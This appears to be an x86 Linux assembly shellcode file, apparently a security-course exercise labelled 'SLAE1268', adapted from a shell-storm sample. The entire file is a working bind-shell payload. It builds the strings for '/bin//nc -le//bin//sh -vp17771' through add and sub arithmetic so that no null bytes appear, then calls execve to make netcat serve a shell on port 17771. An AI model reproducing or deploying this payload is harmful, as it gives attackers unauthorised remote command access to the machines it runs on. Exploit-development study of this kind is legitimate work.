; modified shell code of http://shell-storm.org/shellcode/files/shellcode-872.php>
; SLAE1268


global _start
section .text
_start:
	xor eax,eax
	xor edx,edx
	xor ebx,ebx
	push eax
	mov eax,0x31373737
	push eax
	add eax,0x013a3ff7		
	sub eax,0x01010101		; to eliminate nulls from previous number
	push eax
	
    	;push 0x31373737    		 ;-vp17771
    	;push 0x3170762d
   	
	mov esi,esp			; esp points to port number to bind
	push edx			; push 0 on stack
	
    	;push eax			; replaced by push edx in earlier instruction
	
	add eax,0x3702b902		; add to make equal to 0x68732f2f
    	;push 0x68732f2f     		;-le//bin//sh
	push eax
    	add eax,0x05f63301		; make equal to 0x6e69622f
	sub eax,0x01			;
	push eax
	;push 0x6e69622f
	sub eax,0x3f03f602		; sub to obtain 0x2f656c2d
	push eax
	mov edi,esp	
	push ebx
    	;push 0x2f656c2d
    	
    	

	add eax,0x3408c302		; to make equal to 0x636e2f2f
	push eax
	add eax,0x0afb3301
	sub eax,0x01			; 
	push eax			; to make equal to 0x6e69622f
    	;push 0x636e2f2f     ;/bin//nc
    	;push 0x6e69622f
    	mov ebx, esp

    	push edx
    	push esi
    	push edi
    	push ebx
    	mov ecx, esp
	xor eax,eax
    	mov al,11
    	int 0x80
